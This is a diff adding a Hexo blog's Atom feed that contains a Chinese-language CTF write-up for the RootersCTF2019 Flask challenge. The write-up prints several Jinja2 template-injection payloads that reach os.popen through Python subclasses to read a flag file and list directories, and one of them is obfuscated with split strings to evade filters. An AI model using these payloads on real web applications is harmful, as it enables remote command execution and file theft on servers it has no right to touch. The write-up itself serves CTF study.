@@ -1,0 +1,49 @@
+<?xml version="1.0"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>http://odiws.github.io</id>
+    <title>Hexo • Posts by &#34;ssti&#34; category</title>
+    <link href="http://odiws.github.io" />
+    <updated>2024-06-06T11:43:07.000Z</updated>
+    <category term="buuctf" />
+    <category term="regexp注入" />
+    <category term="thinkphpV6.0.0" />
+    <category term="zip加密" />
+    <entry>
+        <id>http://odiws.github.io/2024/06/06/[RootersCTF2019]I_3_Flask/</id>
+        <title>&#39;[RootersCTF2019]I_&lt;3_Flask&#39;</title>
+        <link rel="alternate" href="http://odiws.github.io/2024/06/06/[RootersCTF2019]I_3_Flask/"/>
+        <content type="html">&lt;h2 id=&#34;rootersctf2019i_️_flask&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#rootersctf2019i_️_flask&#34;&gt;#&lt;/a&gt; [RootersCTF2019]I_❤️_Flask&lt;/h2&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BRootersCTF2019%5DI_3_Flask/1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
+&lt;p&gt;arjun 工具用于&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BRootersCTF2019%5DI_3_Flask/2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这题没有过滤，直接用常规的注入语句即可&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;?name=&amp;#123;% for c in [].__class__.__base__.__subclasses__() %&amp;#125;&amp;#123;% if c.__name__==&#39;catch_warnings&#39; %&amp;#125;&amp;#123;&amp;#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&#34;__import__(&#39;os&#39;).popen(&#39;cat flag.txt&#39;).read()&#34;) &amp;#125;&amp;#125;&amp;#123;% endif %&amp;#125;&amp;#123;% endfor %&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;拿到 flag&lt;br&gt;
+&lt;img data-src=&#34;../images/%5BRootersCTF2019%5DI_3_Flask/3.png&#34; alt=&#34;3&#34;&gt;&lt;/p&gt;
+&lt;p&gt;在该文件同地址的模板是这样的：&lt;/p&gt;
+&lt;p&gt;但是如果是根目录就是：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;#123;% for c in [].__class__.__base__.__subclasses__() %&amp;#125;
+&amp;#123;% if c.__name__ == &#39;catch_warnings&#39; %&amp;#125;
+  &amp;#123;% for b in c.__init__.__globals__.values() %&amp;#125;
+  &amp;#123;% if b.__class__ == &amp;#123;&amp;#125;.__class__ %&amp;#125;
+    &amp;#123;% if &#39;eva&#39;+&#39;l&#39; in b.keys() %&amp;#125;
+      &amp;#123;&amp;#123; b[&#39;eva&#39;+&#39;l&#39;](&#39;__impor&#39;+&#39;t__&#39;+&#39;(&#34;o&#39;+&#39;s&#34;)&#39;+&#39;.pope&#39;+&#39;n&#39;+&#39;(&#34;ls /&#34;).read()&#39;) &amp;#125;&amp;#125;
+    &amp;#123;% endif %&amp;#125;
+  &amp;#123;% endif %&amp;#125;
+  &amp;#123;% endfor %&amp;#125;
+&amp;#123;% endif %&amp;#125;
+&amp;#123;% endfor %&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;还可以：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;#123;% for c in [].__class__.__base__.__subclasses__() %&amp;#125;&amp;#123;% if c.__name__==&#39;catch_warnings&#39; %&amp;#125;&amp;#123;&amp;#123; c.__init__.__globals__[&#39;__builtins__&#39;][&#39;__imp&#39;+&#39;ort__&#39;](&#39;o&#39;+&#39;s&#39;).listdir(&#39;/&#39;)&amp;#125;&amp;#125;&amp;#123;% endif %&amp;#125;&amp;#123;% endfor %&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;还可以用 fenjing 直接秒了：&lt;/p&gt;
+&lt;p&gt;使用方法博客上有：&lt;/p&gt;
+&lt;p&gt;直接秒了&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BRootersCTF2019%5DI_3_Flask/4.png&#34; alt=&#34;4&#34;&gt;&lt;/p&gt;
+</content>
+        <category term="buuctf" />
+        <updated>2024-06-06T11:43:07.000Z</updated>
+    </entry>
+</feed>
